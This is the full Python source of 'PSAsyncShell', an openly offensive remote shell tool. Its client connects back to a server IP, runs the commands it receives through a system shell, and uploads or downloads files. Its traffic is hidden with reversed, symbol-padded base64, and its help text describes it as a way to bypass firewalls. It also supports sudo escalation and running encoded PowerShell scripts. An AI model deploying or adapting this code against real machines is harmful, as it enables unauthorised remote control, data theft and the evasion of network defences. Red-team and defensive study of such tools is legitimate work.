#!/usr/bin/env python3
#==============================#
#  PSAsyncShell by @JoelGMSec  #
#     https://darkbyte.net     #
#==============================#

import sys
import socket
import threading
import time
import os
import random
import base64
import subprocess
import readline
import queue
import neotermcolor
from sys import argv
from datetime import datetime
from neotermcolor import colored
import shlex as oslex
import pwinput

# Variables
system = None
root = False
sudo = False
supersu = False
sudo_password = None
remote_files = []
autocomplete_pending = False
REMOTE_PATH = os.path.expanduser("~")
disable_pw = False
INIT_PHASE = 0
REMOTE_WHOAMI = ""
REMOTE_HOSTNAME = ""
neotermcolor.readline_always_safe = True
PENDING_CD = False
NO_LS = False

# Banner
def show_banner():
    print(colored(r"""
  ____  ____    _                         ____  _          _ _  
 |  _ \/ ___|  / \   ___ _   _ _ __   ___/ ___|| |__   ___| | | 
 | |_) \___ \ / _ \ / __| | | | '_ \ / __\___ \| '_ \ / _ \ | | 
 |  __/ ___) / ___ \\__ \ |_| | | | | (__ ___) | | | |  __/ | | 
 |_|   |____/_/   \_\___/\__, |_| |_|\___|____/|_| |_|\___|_|_| 
                         |___/                                  
""", "blue"))
    print(colored("  ---------------------- by @JoelGMSec -----------------------  ", "green"))
    print()

# Session Help
def show_session_help():
    print(colored("[+] Available commands:", "green"))
    print(colored("    upload: Upload a file from local to remote computer", "blue"))
    print(colored("    download: Download a file from remote to local computer", "blue"))
    print(colored("    import-ps1: Import PowerShell script on Windows hosts", "blue"))
    print(colored("    supersu: Force all commands to be executed as root", "blue"))
    print(colored("    clear/cls: Clear terminal screen", "blue"))
    print(colored("    kill: Kill client connection", "blue"))
    print(colored("    exit: Exit from program\n", "blue"))

# Main Help
def show_help():
    print(colored(" Info: ", "yellow", attrs=["bold"]) + colored(" This tool helps you to get a remote shell", "white"))
    print(colored("        over asynchronous TCP to bypass firewalls", "white"))
    print()
    print(colored(" Usage: ", "yellow", attrs=["bold"]) + colored("PSAsyncShell.py -s -p listen_port", "blue"))
    print(colored("        Listen for a new connection from the client", "green"))
    print()
    print(colored("        ", "white") + colored("PSAsyncShell.py -c server_ip server_port", "blue"))
    print(colored("        Connect the client to a PSAsyncShell server", "green"))
    print()
    print(colored(" Options:", "yellow", attrs=["bold"]))
    print(colored("        -wait seconds: Wait time for downloads", "blue"))
    print(colored("        -debug: Enable debug mode", "blue"))
    print()
    print(colored(" Warning: ", "red", attrs=["bold"]) + colored("All data will be sent unencrypted", "white"))
    print(colored("          Upload function doesn't use MultiPart", "white"))
    print()

# Functions
def update_remote_files_list():
    global remote_files, autocomplete_pending, system, REMOTE_PATH
    autocomplete_pending = True
    if system == "windows":
        command = f"(ls '{REMOTE_PATH}').Name"
    else:
        command = f"ls '{REMOTE_PATH}'"
    return command

def completer(text, state):
    global remote_files
    text_lower = text.lower()
    options = [f for f in remote_files if f.lower().startswith(text_lower)]
    if state < len(options):
        return options[state]
    return None

def get_custom_prompt():
    global system, root, REMOTE_PATH, REMOTE_WHOAMI, REMOTE_HOSTNAME
    
    try:
        whoami = REMOTE_WHOAMI if REMOTE_WHOAMI else "user"
        hostname = REMOTE_HOSTNAME if REMOTE_HOSTNAME else "host"
        
        if root:
            whoami = "root"

        path = REMOTE_PATH
        if "\\" in path:
            system = "windows"
            slash = "\\"
        else:
            system = "linux" 
            slash = "/"

        path = str(path).rstrip()
        if len(path) > 24:
            parts = path.split(slash)[-3:]
            shortpath = ".." + slash + slash.join(parts)
        else:
            shortpath = path

        cinput = colored(" [PSAsyncShell] ", "grey", "on_green") + colored(" ", "green", "on_blue")
        cinput += colored(f"{whoami}@{hostname} ", "grey", "on_blue")
        cinput += colored(" ", "blue", "on_yellow") + colored(shortpath + " ", "grey", "on_yellow")
        cinput += colored(" ", "yellow")
        return cinput + "\001\033[0m\002"

    except:
        return colored(" [PSAsyncShell] > ", "blue")

# Variables
OS_VERSION = sys.platform
START = True
DATA_COUNT = 1
DEBUG = False
LOCAL_SLASH = "\\" if OS_VERSION == "win32" else "/"
SYMBOLS = '..........$.}.{.>.<.*.%.;.:./.(.).@.~.=.].[.!.?.^.&.#.|.........'
UPLOAD = False
DOWNLOAD = False
MULTI = False
MULTI_DOWN = False
MULTI_DATA = ""
PS_EXIT = False
REMOTE_SLASH = "\\" if OS_VERSION == "win32" else "/"
CHUNK_SIZE = None
WAIT_SECONDS = 0

# Functions
def wait_for_download(seconds):
    wait_count = seconds + 1
    cursor_pos = 0
    
    while wait_count > 0:
        if wait_count != 0:
            print(colored(f"WAITING: {wait_count}", "yellow"), end='', flush=True)
            wait_count -= 1
        
        print("\r" + " " * 30, end='', flush=True)
        print("\r" + colored(f"WAITING: {wait_count}", "yellow"), end='', flush=True)
        time.sleep(1)
    
    print("\r" + " " * 30, end='', flush=True)
    print("\r", end='', flush=True)

def get_chunk(text, chunk_size):
    chunks = []
    i = 0
    while i <= len(text) - chunk_size:
        chunks.append(text[i:i+chunk_size])
        i += chunk_size
    if i < len(text):
        chunks.append(text[i:])
    return chunks

def send_chunk(ip, port, data, debug=False):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        if debug:
            chunk_data = replace_symbols(data)
            chunk_data = chunk_data.replace(",", "")
            print(colored(f"MULTIOUT: {chunk_data}", "white"))
        sock.sendall((data + "\n").encode('ascii'))
        sock.close()
    except Exception as e:
        if debug:
            print(colored(f"Error in send_chunk: {e}", "red"))
        time.sleep(0.5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall((data + "\n").encode('ascii'))
            sock.close()
        except Exception as e2:
            if debug:
                print(colored(f"Retry failed: {e2}", "red"))

def replace_symbols(text):
    for symbol in SYMBOLS:
        text = text.replace(symbol, ",")
    return text

def r64_encoder(mode, data, file_path=None):
    if mode == "-t":
        base64_data = base64.b64encode(data.encode('utf-8')).decode('ascii')
    elif mode == "-f":
        with open(data, 'rb') as f:
            base64_data = base64.b64encode(f.read()).decode('ascii')
    
    base64_data = base64_data.split("=")[0]
    base64_data = base64_data.replace("+", "-")
    base64_data = base64_data.replace("/", "_")
    
    rev_b64 = list(base64_data)
    rev_b64.reverse()
    r64_base = ''.join(rev_b64)
    
    result = ""
    chunk_size = random.randint(2, 3)
    chunks = [r64_base[i:i+chunk_size] for i in range(0, len(r64_base), chunk_size)]
    
    for chunk in chunks:
        dots = "." * random.randint(1, 6)
        random_index1 = random.randint(0, len(SYMBOLS) - 1)
        random_index2 = random.randint(0, len(SYMBOLS) - 1)
        result += dots + SYMBOLS[random_index1] + chunk + SYMBOLS[random_index2]
    
    return result

def r64_decoder(mode, data, file_path=None):
    base64_data = list(data)
    base64_data.reverse()
    base64_data = ''.join(base64_data)
    base64_data = replace_symbols(base64_data)
    base64_data = base64_data.replace(",", "")
    base64_data = base64_data.replace("-", "+")
    base64_data = base64_data.replace("_", "/")
    
    padding = len(base64_data) % 4
    if padding == 2:
        base64_data += "=="
    elif padding == 3:
        base64_data += "="
    
    if mode == "-t":
        try:
            decoded = base64.b64decode(base64_data).decode('utf-8')
            return decoded
        except Exception as e:
            if DEBUG:
                print(colored(f"Decode error: {e}", "red"))
            return ""
    elif mode == "-f":
        try:
            decoded = base64.b64decode(base64_data)
            with open(file_path, 'wb') as f:
                f.write(decoded)
        except Exception as e:
            if DEBUG:
                print(colored(f"File decode error: {e}", "red"))

def execute_command(cmd):
    try:
        if OS_VERSION == "win32":
            result = subprocess.run(["powershell", "-Command", cmd], 
                                  capture_output=True, text=True, shell=True)
        else:
            result = subprocess.run(cmd, shell=True, 
                                  capture_output=True, text=True)
        
        if result.stdout:
            return result.stdout
        elif result.stderr:
            return result.stderr
        else:
            return ""
    except Exception as e:
        return f"Error executing command: {e}"

def server_mode(ip, port):
    global START, DATA_COUNT, REMOTE_PATH, UPLOAD, DOWNLOAD, MULTI, MULTI_DOWN, MULTI_DATA, PS_EXIT, REMOTE_SLASH
    global system, root, sudo, supersu, sudo_password, remote_files, autocomplete_pending, disable_pw
    global INIT_PHASE, REMOTE_WHOAMI, REMOTE_HOSTNAME, PENDING_CD, NO_LS
    
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
    
    silent = ("-silent" in argv)
    if not silent:
        show_banner()
        print(colored("[+] Waiting for new connection..", "yellow"))
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((ip, port))
        server_socket.listen(1)
    except Exception as e:
        print(colored(f"[!] Error starting server: {e}", "red"))
        return
    
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            
            if START:
                command = r64_encoder("-t", "[+] PSAsyncShell OK!")
            elif INIT_PHASE == 1:
                command = r64_encoder("-t", "whoami")
            elif INIT_PHASE == 2:
                command = r64_encoder("-t", "hostname")
            elif INIT_PHASE == 3:
                autocomplete_pending = True
                if system == "windows":
                    command = r64_encoder("-t", "(ls).Name")
                else:
                    command = r64_encoder("-t", "ls")
            elif PENDING_CD:
                autocomplete_pending = True
                if system == "windows":
                    command = r64_encoder("-t", f"(ls '{REMOTE_PATH}').Name")
                else:
                    command = r64_encoder("-t", f"ls '{REMOTE_PATH}'")
            elif UPLOAD:
                command_decoded = r64_decoder("-t", command)
                downfile = command_decoded.split()[1]
                command = r64_encoder("-f", downfile)
                UPLOAD = False
            elif MULTI:
                command = r64_encoder("-t", "[+] MultiPart Data OK!")
            else:
                path = REMOTE_PATH.replace("\n", "").replace("\r", "")
                command = None
                
                while True:
                    try:
                        cmd_input = input(get_custom_prompt())
                    except EOFError:
                        cmd_input = "exit"
                    
                    if not cmd_input.strip():
                        print()
                        continue
                    
                    parts = cmd_input.strip().split()
                    cmd = parts[0].lower() if parts else ""
                    
                    if cmd == "help":
                        show_session_help()
                        continue
                    
                    elif cmd in ["clear", "cls"]:
                        os.system('cls' if OS_VERSION == 'win32' else 'clear')
                        continue
                    
                    elif cmd == "exit":
                        if root:
                            root = False
                            supersu = False
                            sudo = False
                            print(colored("[+] Exited root mode", "green"))
                            print()
                            continue
                        else:
                            PS_EXIT = True
                            command = "exit"
                            break
                    
                    elif cmd == "kill":
                        command = "exit"
                        PS_EXIT = True
                        break
                    
                    elif cmd == "supersu":
                        if system != "linux":
                            print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
                        else:
                            supersu = True
                            root = True
                            print(colored("[+] SuperSu mode activated. All commands will be run as root.\n", "green"))
                        continue
                    
                    elif cmd == "sudo":
                        if system != "linux":
                            print(colored("[!] Error: sudo is only available on Linux hosts\n", "red"))
                        else:
                            if len(parts) < 2:
                                print(colored("[!] Usage: sudo \"command\" or sudo su\n", "red"))
                            else:
                                sudo_cmd = ' '.join(parts[1:])
                                if not sudo:
                                    print(colored(f"[sudo] password for {REMOTE_WHOAMI}:\n", "red"))
                                    if disable_pw:
                                        sudo_password = input(get_custom_prompt())
                                    else:
                                        sudo_password = pwinput.pwinput(prompt=get_custom_prompt())
                                    command = f"echo '{sudo_password}' | sudo -S {sudo_cmd}"
                                    sudo = True
                                    if "su" in parts:
                                        root = True
                                    break
                                else:
                                    command = f"echo '{sudo_password}' | sudo -S {sudo_cmd}"
                                    if "su" in parts:
                                        root = True
                                    break
                        continue
                    
                    elif cmd == "import-ps1":
                        if system != "windows":
                            print(colored("[!] Error: import-ps1 only works on Windows hosts\n", "red"))
                        else:
                            if len(parts) < 2:
                                print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
                            else:
                                ps1_file = parts[1]
                                try:
                                    with open(ps1_file, 'r', encoding='utf-8', errors='ignore') as f:
                                        ps1_content = f.read()
                                    base64_script = base64.b64encode(ps1_content.encode('utf-16-le')).decode('ascii')
                                    command = f"powershell -EncodedCommand {base64_script}"
                                    print(colored(f"[+] Importing PowerShell script: {ps1_file}\n", "green"))
                                    break
                                except FileNotFoundError:
                                    print(colored(f"[!] File not found: {ps1_file}\n", "red"))
                                except Exception as e:
                                    print(colored(f"[!] Error reading file: {str(e)}\n", "red"))
                        continue
                    
                    elif cmd == "upload":
                        if len(parts) < 3:
                            print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n", "red"))
                        else:
                            local_file = parts[1]
                            remote_file = parts[2]
                            try:
                                with open(local_file, 'rb') as f:
                                    file_data = f.read()
                                file_b64 = base64.b64encode(file_data).decode('ascii')
                                if system == "windows":
                                    command = f"powershell -Command \"[System.Convert]::FromBase64String('{file_b64}') | Set-Content -Path '{remote_file}' -Encoding Byte\""
                                else:
                                    command = f"echo '{file_b64}' | base64 -d > {remote_file}"
                                
                                print(colored(f"[+] Uploading {local_file} to {remote_file}...\n", "green"))
                                break
                            except FileNotFoundError:
                                print(colored(f"[!] Local file not found: {local_file}\n", "red"))
                            except Exception as e:
                                print(colored(f"[!] Error uploading file: {str(e)}\n", "red"))
                        continue
                    
                    elif cmd == "download":
                        if len(parts) < 3:
                            print(colored("[!] Usage: download \"remote_file\" \"local_file\"\n", "red"))
                        else:
                            remote_file = parts[1]
                            local_file = parts[2]
                            command = f"download {remote_file} {local_file}"
                            DOWNLOAD = True
                            print(colored(f"[+] Downloading {remote_file} to {local_file}...\n", "green"))
                            break
                    
                    elif cmd == "pwd":
                        print(colored(f"{REMOTE_PATH}\n", "white"))
                        continue
                    
                    elif cmd.startswith("cd"):
                        command = cmd_input
                        if root and system == "linux":
                            if supersu:
                                command = f"su -c '{cmd_input}'"
                            elif sudo:
                                command = f"echo '{sudo_password}' | sudo -S {cmd_input}"
                        PENDING_CD = True
                        break
                    
                    else:
                        if root and system == "linux":
                            if supersu:
                                command = f"su -c '{cmd_input}'"
                            elif sudo:
                                command = f"echo '{sudo_password}' | sudo -S {cmd_input}"
                        else:
                            command = cmd_input
                        break
                
                if command:
                    command = r64_encoder("-t", command)
            
            if DEBUG:
                print(colored(f"CMD: {command}", "white"))
            
            client_socket.sendall(command.encode('ascii'))
            client_socket.close()
            
            if DOWNLOAD:
                if "-wait" in argv:
                    wait_for_download(WAIT_SECONDS)
                    MULTI = True
                    DOWNLOAD = False
                    print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
                    MULTI_DOWN = True
            time.sleep(0.5)
            
            if PS_EXIT:
                print(colored("[!] Exiting!\n", "red"))
                break
            
            server_socket.listen(1)
            client_socket, client_address = server_socket.accept()
            
            data = client_socket.recv(4096).decode('ascii').strip()
            
            if DEBUG:
                print(colored(f"DATA: {data}", "white"))
            
            if START:
                path = r64_decoder("-t", data)
                START = False
                data = None
                if "\\" in path:
                    REMOTE_SLASH = "\\"
                    system = "windows"
                else:
                    REMOTE_SLASH = "/"
                    system = "linux"
                REMOTE_PATH = path
                INIT_PHASE = 1
            
            elif INIT_PHASE == 1:
                REMOTE_WHOAMI = r64_decoder("-t", data).strip()
                data = None
                INIT_PHASE = 2
            
            elif INIT_PHASE == 2:
                REMOTE_HOSTNAME = r64_decoder("-t", data).strip()
                data = None
                if not NO_LS:
                    INIT_PHASE = 3
                else:
                    INIT_PHASE = 4
            
            elif INIT_PHASE == 3:
                if autocomplete_pending:
                    remote_files = [f.strip() for f in r64_decoder("-t", data).strip().split('\n') if f.strip()]
                    autocomplete_pending = False
                    data = None
                    INIT_PHASE = 4
                else:
                    INIT_PHASE = 4
            
            elif PENDING_CD:
                data_decoded = r64_decoder("-t", data)
                if data_decoded and not data_decoded.startswith("Error"):
                    REMOTE_PATH = data_decoded.strip()
                    data = None
                    
                    if NO_LS:
                        PENDING_CD = False
                    else:
                        autocomplete_pending = True
                        if system == "windows":
                            command = r64_encoder("-t", f"(ls '{REMOTE_PATH}').Name")
                        else:
                            command = r64_encoder("-t", f"ls '{REMOTE_PATH}'")
                        
                        client_socket.close()
                        time.sleep(0.5)
                        server_socket.listen(1)
                        client_socket, client_address = server_socket.accept()
                        client_socket.sendall(command.encode('ascii'))
                        client_socket.close()
                        time.sleep(0.5)
                        server_socket.listen(1)
                        client_socket, client_address = server_socket.accept()
                        data = client_socket.recv(4096).decode('ascii').strip()
                        
                        if autocomplete_pending:
                            remote_files = [f.strip() for f in r64_decoder("-t", data).strip().split('\n') if f.strip()]
                            autocomplete_pending = False
                        
                        data = None
                        PENDING_CD = False
                else:
                    data = data_decoded
                    PENDING_CD = False
            
            elif DOWNLOAD:
                if r64_decoder("-t", data) == "[+] Sending MultiPart Data..":
                    data = None
                    print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
                    MULTI = True
                    DOWNLOAD = False
                    MULTI_DOWN = True
                else:
                    file_data = r64_decoder("-f", data, parts[2] if 'parts' in locals() else "downloaded_file")
                    data = f"[+] File downloaded successfully!\n"
                    DOWNLOAD = False
            
            elif MULTI:
                if r64_decoder("-t", data) == "[+] MultiPart Data OK!":
                    if MULTI_DOWN:
                        MULTI = False
                        r64_decoder("-f", MULTI_DATA, parts[2] if 'parts' in locals() else "downloaded_file")
                        data = f"[+] File downloaded successfully!\n"
                        MULTI_DOWN = False
                        DATA_COUNT = 1
                        MULTI_DATA = ""
                        print("\n")
                    else:
                        MULTI = False
                        data = r64_decoder("-t", MULTI_DATA)
                        MULTI_DATA = ""
                        print("\n")
                else:
                    cursor_pos = 0
                    MULTI_DATA += data
                    data = None
                    print(colored(".", "yellow"), end='', flush=True)
                    DATA_COUNT += 1
                    if DATA_COUNT == 8:
                        DATA_COUNT = 1
                        print("\r" + " " * 40, end='', flush=True)
                        print("\r" + colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
            
            else:
                if data is not None:
                    data_decoded = r64_decoder("-t", data)
                    if command and ("pwd" in r64_decoder("-t", command) or "Get-Location" in r64_decoder("-t", command)):
                        if data_decoded and not data_decoded.startswith("Error"):
                            REMOTE_PATH = data_decoded.strip()
                    data = data_decoded
            
            if not data and not MULTI and INIT_PHASE == 4 and not PENDING_CD:
                print()
            
            if data == "[+] Ready to upload!":
                data = None
            elif data == "[+] File uploaded!":
                data = f"[+] File uploaded successfully!\n"
            elif data == "[+] Sending MultiPart Data..":
                data = None
                MULTI = True
                print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
            
            if data and INIT_PHASE == 4 and not PENDING_CD:
                if '[+]' in data:
                    print(colored(data, "green"))
                else:
                    print(colored(data, "white"))
            
            client_socket.close()
            
        except Exception as e:
            if DEBUG:
                print(colored(f"Server error: {e}", "red"))
            continue
    
    server_socket.close()

def client_mode(ip, port):
    global START, UPLOAD, DOWNLOAD, MULTI, MULTI_DATA, CHUNK_SIZE
    
    while True:
        cmd = None
        output = None   
        client_data = {
            'Current': '*',
            'ClientID': ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=12)),
            'ComputerName': os.environ.get('COMPUTERNAME', 'unknown').lower(),
            'UserName': os.environ.get('USERNAME', 'unknown').lower()
        }
        
        time.sleep(0.5)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            client_data['Address'] = sock.getsockname()[0]
            
            data = sock.recv(4096).decode('ascii').strip()
            
            if UPLOAD:
                r64_decoder("-f", data, downfile)
            else:
                cmd = r64_decoder("-t", data)
            
            if cmd == "[+] PSAsyncShell OK!":
                START = True
            
            if DEBUG:
                print(colored(f"CMD: {cmd}", "white"))
            
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            
            if cmd and cmd.startswith("download"):
                parts = cmd.split()
                if len(parts) >= 3:
                    remote_file = parts[1]
                    try:
                        with open(remote_file, 'rb') as f:
                            file_data = f.read()
                        output = r64_encoder("-f", remote_file)
                    except:
                        output = r64_encoder("-t", f"[!] Error reading file: {remote_file}")
            elif cmd and cmd.startswith("upload"):
                output = r64_encoder("-t", "[+] Ready to upload!")
                UPLOAD = True
            elif UPLOAD:
                output = r64_encoder("-t", "[+] File uploaded!")
                UPLOAD = False
            elif START:
                output = r64_encoder("-t", os.getcwd())
                START = False
            elif MULTI:
                chunks = get_chunk(MULTI_DATA, CHUNK_SIZE)
                for chunk in chunks:
                    time.sleep(1.2)
                    send_chunk(ip, port, chunk, DEBUG)
                    send_chunk(ip, port, chunk, DEBUG)
                MULTI = "SendOut"
            elif MULTI == "SendOut":
                output = r64_encoder("-t", "[+] MultiPart Data OK!")
                MULTI = False
                MULTI_DATA = ""
            elif cmd and (cmd.startswith("cd") or cmd.startswith("Set-Location")):
                current_dir = os.getcwd()
                try:
                    if cmd.startswith("cd "):
                        target_path = cmd[3:].strip()
                        if (target_path.startswith('"') and target_path.endswith('"')) or \
                           (target_path.startswith("'") and target_path.endswith("'")):
                            target_path = target_path[1:-1]
                        os.chdir(target_path)
                    elif cmd == "cd":
                        os.chdir(os.path.expanduser("~"))
                    elif cmd.startswith("Set-Location "):
                        target_path = cmd[13:].strip()
                        if (target_path.startswith('"') and target_path.endswith('"')) or \
                           (target_path.startswith("'") and target_path.endswith("'")):
                            target_path = target_path[1:-1]
                        os.chdir(target_path)
                    elif cmd == "Set-Location":
                        os.chdir(os.path.expanduser("~"))
                    
                    output = r64_encoder("-t", os.getcwd())
                except Exception as e:
                    output = r64_encoder("-t", f"Error changing directory: {str(e)}")
            else:
                if cmd:
                    result = execute_command(cmd)
                    if result:
                        output = r64_encoder("-t", result)
                    else:
                        output = r64_encoder("-t", os.getcwd())
                else:
                    output = r64_encoder("-t", os.getcwd())
            
            if CHUNK_SIZE and output and len(output) >= CHUNK_SIZE:
                MULTI_DATA = output
                MULTI = True
                output = r64_encoder("-t", "[+] Sending MultiPart Data..")
            
            if DEBUG and not MULTI:
                decoded_out = r64_decoder('-t', output)
                print(colored(f"OUT: {decoded_out}", "white"))
            
            sock.sendall(output.encode('ascii'))
            sock.close()
            
        except Exception as e:
            if DEBUG:
                print(colored(f"Client error: {e}", "red"))
            time.sleep(1)
            continue

def main():
    global DEBUG, CHUNK_SIZE, WAIT_SECONDS, disable_pw, NO_LS
    
    if len(argv) < 2:
        show_banner()
        show_help()
        print(colored("[!] Not enough parameters!", "red"))
        return
    
    if argv[1] in ["-h", "-help", "--help"]:
        show_banner()
        show_help()
        return
    
    if len(argv) < 3:
        show_banner()
        show_help()
        print(colored("[!] Not enough parameters!", "red"))
        return
    
    if "-npw" in argv:
        disable_pw = True
        argv.remove("-npw")
    
    if "-nls" in argv:
        NO_LS = True
        argv.remove("-nls")
    
    ip = "0.0.0.0"
    port = 0
    
    if argv[1] == "-s":
        if "-p" in argv:
            p_index = argv.index("-p")
            if p_index + 1 < len(argv):
                port = int(argv[p_index + 1])
        else:
            port = int(argv[2])
    elif argv[1] == "-c":
        ip = argv[2]
        port = int(argv[3])
    
    if "-debug" in argv:
        DEBUG = True
    
    if "-wait" in argv:
        wait_index = argv.index("-wait")
        if wait_index + 1 < len(argv):
            WAIT_SECONDS = int(argv[wait_index + 1])
    
    if len(argv) > 4 and argv[4].isdigit():
        CHUNK_SIZE = int(argv[4])
    
    if argv[1] == "-s":
        server_mode(ip, port)
    elif argv[1] == "-c":
        client_mode(ip, port)

if __name__ == "__main__":
    try:
        main()

    except KeyboardInterrupt:
        print (colored("\n[!] Exiting..\n", "red"))
        exit(0)
